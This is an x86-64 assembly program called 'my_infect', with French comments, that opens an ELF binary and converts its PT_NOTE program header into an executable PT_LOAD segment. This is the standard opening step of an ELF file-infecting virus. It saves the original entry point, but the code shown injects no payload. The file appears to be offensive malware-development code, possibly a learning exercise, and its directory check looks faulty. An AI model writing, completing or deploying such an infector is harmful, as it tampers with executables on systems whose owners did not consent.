section .data
; Messages à afficher
msg_not_elf_new db "Ce fichier n'est pas un ELF compatible.",10
len_not_elf_new equ $ - msg_not_elf_new
 
msg_dir_new db "C'est un dossier, operation impossible.",10
len_dir_new equ $ - msg_dir_new
 
msg_usage_new db "Usage: ./my_infect <filename>",10
len_usage_new equ $ - msg_usage_new
 
msg_open_err_new db "Impossible d'ouvrir ce fichier.",10
len_open_err_new equ $ - msg_open_err_new
 
msg_success db "Le PT_NOTE a ete transforme en PT_LOAD avec succes !",10
len_success equ $ - msg_success
 
section .bss
magic_area resb 4
info_stat resb 144
elf_buf resb 64
ph_buf resb 56
 
ph_off     resq 1
ph_esize   resw 1
ph_count   resw 1
 
cur_ofs    resq 1
fd_sav     resq 1
nt_ofs     resq 1
nt_found   resb 1
o_entry    resq 1
vmax_end   resq 1
 
section .text
global _start
 
_start:
    ; Vérification des arguments
    pop rax
    cmp rax, 2
    jl show_usage
    pop rax
    pop rdi
 
    ; Stat sur le fichier
    mov rax,4   ; stat
    lea rsi,[info_stat]
    syscall
    cmp rax,0
    jne open_fail
 
    ; Vérifie si c'est un dossier
    mov rax,[info_stat+16]
    cmp rax,2
    je is_dircase
 
    ; Ouvre le fichier en R/W
    mov rax,2   ; open
    mov rsi,2   ; O_RDWR
    syscall
    cmp rax,0
    jl open_fail
    mov [fd_sav], rax
 
    ; Lecture du magic ELF
    mov rax,0   ; read
    mov rdi,[fd_sav]
    mov rsi,magic_area
    mov rdx,4
    syscall
    cmp rax,4
    jne not_elfcase
 
    mov eax,[magic_area]
    cmp eax,0x464C457F
    jne not_elfcase
 
    ; Ici on sait que c'est un fichier ELF
    ; Lecture du header ELF (64 bytes)
    mov rax,8   ; lseek
    mov rdi,[fd_sav]
    xor rsi,rsi
    xor rdx,rdx
    syscall
    cmp rax,-1
    je open_fail
 
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[elf_buf]
    mov rdx,64
    syscall
    cmp rax,64
    jne open_fail
 
    ; Récupération info Program Header
    mov rax,[elf_buf+0x20]
    mov [ph_off], rax
    movzx eax, word [elf_buf+0x38]
    mov [ph_count], ax
    movzx eax, word [elf_buf+0x36]
    mov [ph_esize], ax
    mov rax,[elf_buf+24]
    mov [o_entry], rax
 
    movzx r12, word [ph_count]
    mov rsi,[ph_off]
    mov [cur_ofs], rsi
 
    ; On cherche PT_NOTE
    mov byte [nt_found],0
 
find_nt:
    cmp r12,0
    je no_nt
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[cur_ofs]
    xor rdx,rdx
    syscall
 
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx,word [ph_esize]
    syscall
 
    mov eax, dword [ph_buf]
    cmp eax,4  ; PT_NOTE
    jne ph_next
 
    mov rax,[cur_ofs]
    mov [nt_ofs],rax
    mov byte [nt_found],1
    jmp done_nt
 
ph_next:
    movzx rax,word [ph_esize]
    mov rsi,[cur_ofs]
    add rsi,rax
    mov [cur_ofs],rsi
    dec r12
    jmp find_nt
 
no_nt:
    ; Pas de PT_NOTE trouvé
    jmp close_end
 
done_nt:
    mov al,[nt_found]
    cmp al,0
    je close_end
 
    ; On va transformer ce PT_NOTE en PT_LOAD
    ; Lecture du PH NOTE
    mov rax,8
    mov rdi,[fd_sav]
    mov rsi,[nt_ofs]
    xor rdx,rdx
    syscall
 
    mov rax,0
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx,word [ph_esize]
    syscall
 
    ; Changement du type en PT_LOAD et des flags
    mov dword [ph_buf],1  ; PT_LOAD
    mov dword [ph_buf+4],5 ; p_flags = 5 (r-x)
 
    ; Réécriture du PH modifié
    mov rax,8           ; lseek
    mov rdi,[fd_sav]
    mov rsi,[nt_ofs]
    xor rdx,rdx
    syscall
    cmp rax,-1
    je open_fail
 
    mov rax,1           ; write
    mov rdi,[fd_sav]
    lea rsi,[ph_buf]
    movzx rdx, word [ph_esize]
    syscall
    cmp rax,-1
    je open_fail
 
    ; Affichage du message de réussite
    mov rax,1
    mov rdi,1
    lea rsi,[msg_success]
    mov rdx,len_success
    syscall
 
    jmp end_exit
 
show_usage:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_usage_new]
    mov rdx,len_usage_new
    syscall
    jmp end_exit
 
open_fail:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_open_err_new]
    mov rdx,len_open_err_new
    syscall
    jmp end_exit
 
not_elfcase:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_not_elf_new]
    mov rdx,len_not_elf_new
    syscall
    jmp close_end
 
is_dircase:
    mov rax,1
    mov rdi,1
    lea rsi,[msg_dir_new]
    mov rdx,len_dir_new
    syscall
    jmp end_exit
 
close_end:
    mov rax,3
    mov rdi,[fd_sav]
    syscall
 
end_exit:
    mov rax,60
    xor rdi,rdi
    syscall
